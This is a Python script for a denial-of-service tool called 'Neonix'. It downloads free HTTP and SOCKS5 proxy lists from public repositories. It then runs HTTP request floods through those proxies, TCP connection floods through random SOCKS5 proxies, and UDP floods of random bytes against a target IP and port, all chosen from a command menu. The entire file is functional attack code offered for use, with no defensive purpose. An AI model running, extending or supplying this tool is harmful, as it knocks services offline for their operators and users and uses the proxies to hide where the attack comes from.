import aiohttp
import requests
import asyncio
from flask import Flask, render_template, request,jsonify
from datetime import datetime
import sqlite3
from fake_useragent import UserAgent
from time import sleep as ssleep
import datetime
from bs4 import BeautifulSoup
import random, requests
from pyfiglet import Figlet
from termcolor import colored, cprint
import asyncio
import aiohttp
from colorama import init, Fore, Back, Style
import os
import time
import pyfiglet
import socket 
import ntplib
from time import ctime
import string
import socks

tasks = []
ua = UserAgent()

http_links = [
"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
"https://sunny9577.github.io/proxy-scraper/generated/http_proxies.txt",
#"https://raw.codeproxy.net/MuRongPIG/Proxy-Master/main/http.txt",
"https://raw.codeproxy.net/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
"https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
"https://raw.githubusercontent.com/fahimscirex/proxybd/master/proxylist/http.txt",
"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
"https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
"https://raw.githubusercontent.com/Volodichev/proxy-list/main/http.txt",
"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
"https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
"https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
"https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
"https://www.proxy-list.download/api/v1/get?type=http",
"https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt"
]

socks5_links = [
"https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt"
]

urls = []
http_proxies = []

def __paste__(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length)).encode()

async def check():
	os.remove('proxies.txt')
	os.system('clear')
	for url in http_links:
		async with aiohttp.ClientSession() as session:
			async with session.get(url, headers={"User-Agent": ua.random}, timeout=40) as response:
				text = await response.text()
				prox = len(text.split('\n'))
				print('[*] Getted '+str(prox) + ' http proxies')
		with open('proxies.txt', 'a') as file:
			file.write(f"{text}\n")

async def check2():
	os.remove('socks5.txt')
	os.system('clear')
	for url in socks5_links:
		async with aiohttp.ClientSession() as session:
			async with session.get(url, headers={"User-Agent": ua.random}, timeout=40) as response:
				text = await response.text()
				prox = len(text.split('\n'))
				print('[*] Getted '+str(prox) + ' socks5 proxies')
		with open('socks5.txt', 'a') as file:
			file.write(f"{text.replace('socks5://', '')}\n")

async def __udp__(ip, port, until_datetime):
	while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
	   try:
	       with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_socket:
	       	udp_socket.settimeout(5)
	       	message = __paste__(10)
	       	udp_socket.sendto(message, (ip, port))
	       	print(f"Connected to \033[1;32m{ip}\033[0m: port=\033[1;32m{port}\033[0m protocol=\033[1;32mUDP\033[0m")
	   except Exception as e:
	   	print(colored(e, color='red'))

async def __tcp__(ip, port, until_datetime):
	socksproxy = open('socks5.txt', 'r').read().split('\n')
	while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
	   try:
	   	proxy = random.choice(socksproxy)
	   	proxy = f"{proxy}".split(':')
	   	proxy_host = proxy[0]
	   	proxy_port = int(proxy[1])
	   	socks.set_default_proxy(socks.SOCKS5, proxy_host, proxy_port)
	   	socket.socket = socks.socksocket
	   	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_socket:
	   		tcp_socket.settimeout(5)
	   		tcp_socket.connect((ip, port))
	   		print(f"Connected to \033[1;32m{ip}\033[0m: port=\033[1;32m{port}\033[0m protocol=\033[1;32mTCP\033[0m")
	   except Exception as e:
	   	print(colored(e, color='red'))

async def makerequest(ip, port, proxy, packet):
	try:
		        async with aiohttp.ClientSession() as session:
		        	for _ in range(int(packet)):
		        		async with session.get(ip, headers={"User-Agent": ua.random}, proxy=f"http://{proxy}", timeout=40) as response:
		        			print(f"Connected to \033[1;32m{ip}\033[0m: port=\033[1;32m{port}\033[0m protocol=\033[1;32mHTTP\033[0m")
	except Exception as e:
		print(e)

async def httpflood(ip, port, until_datetime, packet):
	proxies = open('proxies.txt', 'r').read().split('\n')
	while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
		for _ in range(30000):
			proxy = random.choice(proxies)
			tasks.append(makerequest(ip, port, proxy, packet))
		await asyncio.gather(*tasks)

async def main_menu():
	print(colored(f"""  _        _______  _______  _       _________         
 ( (    /|(  ____ \(  ___  )( (    /|\__   __/|\     /|
 |  \  ( || (    \/| (   ) ||  \  ( |   ) (   ( \   / )
 |   \ | || (__    | |   | ||   \ | |   | |    \ (_) / 
 | (\ \) ||  __)   | |   | || (\ \) |   | |     ) _ (  
 | | \   || (      | |   | || | \   |   | |    / ( ) \ 
 | )  \  || (____/\| (___) || )  \  |___) (___( /   \ )
 |/    )_)(_______/(_______)|/    )_)\_______/|/     \|
                                                       

""", color="red"))
	print(colored("                    >> Neonix <<", color="green"))
	print(colored(f"                     [ Enter ]", color="blue"))
	input()
	await methods()

async def methods():
	os.system('clear')
	print(f"""     ___       ___       ___       ___       ___       ___   
    /\__\     /\  \     /\  \     /\__\     /\  \     /\__\  
   /:| _|_   /::\  \   /::\  \   /:| _|_   _\:\  \   |::L__L 
  /::|/\__\ /::\:\__\ /:/\:\__\ /::|/\__\ /\/::\__\ /::::\__\
  \/|::/  / \:\:\/  / \:\/:/  / \/|::/  / \::/\/__/ \;::;/__/
    |:/  /   \:\/  /   \::/  /    |:/  /   \:\__\    |::|__| 
    \/__/     \/__/     \/__/     \/__/     \/__/     \/__/  

""")
	print(f"( [ HTTP-V1 ] - http -i http://example.com -p 80 -t 60 -r 64 )")
	print(f"( [ HTTP-V2 ] - http2 -i http://example.com -p 80 -t 60 -r 64 )")
	print(f"( [ TCP-FLD ] - tcp -i 0.0.0.0 -p 80 -t 60 )")
	print(f"( [ UDP-FLD ] - udp -i 0.0.0.0 -p 80 -t 60 )")
	
	howto = input(colored(f"\n(Admin) – "))
	
	if howto == '':
		pass

	elif 'tcp' in howto:
		print('\n\n')
		args = howto.split()
		ip = None
		port = 80
		for i in range(len(args)):
		    if args[i] == '-i':
		    	ip = args[i + 1]
		    elif args[i] == '-p':
		    	port = int(args[i + 1])
		    elif args[i] == '-t':
		    	second = int(args[i + 1])
		until_datetime = datetime.datetime.now() + datetime.timedelta(seconds=second)
		for _ in range(1):
			tasks.append(__tcp__(ip, port, until_datetime))
		os.system('clear')
		await asyncio.gather(*tasks)
	elif 'udp' in howto:
		args = howto.split()
		ip = None
		port = 53
		for i in range(len(args)):
		    if args[i] == '-i':
		    	ip = args[i + 1]
		    elif args[i] == '-p':
		    	port = int(args[i + 1])
		    elif args[i] == '-t':
		    	second = int(args[i + 1])
		for _ in range(1):
			until_datetime = datetime.datetime.now() + datetime.timedelta(seconds=second)
			tasks.append(__udp__(ip, port, until_datetime))
		os.system('clear')
		await asyncio.gather(*tasks)
	elif 'http' in howto:
		print('\n\n')
		args = howto.split()
		ip = None
		port = None
		for i in range(len(args)):
		    if args[i] == '-i':
		    	ip = args[i + 1]
		    elif args[i] == '-p':
		    	port = int(args[i + 1])
		    elif args[i] == '-t':
		    	second = int(args[i + 1])
		    elif args[i] == '-r':
		    	packet = int(args[i + 1])
		until_datetime = datetime.datetime.now() + datetime.timedelta(seconds=second)
		while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
			for _ in range(1):
				tasks.append(httpflood(ip, port, until_datetime, packet))
			os.system('clear')
			await asyncio.gather(*tasks)
	else:
		print("[*] Exit..")

asyncio.run(check())
asyncio.run(check2())
asyncio.run(main_menu())
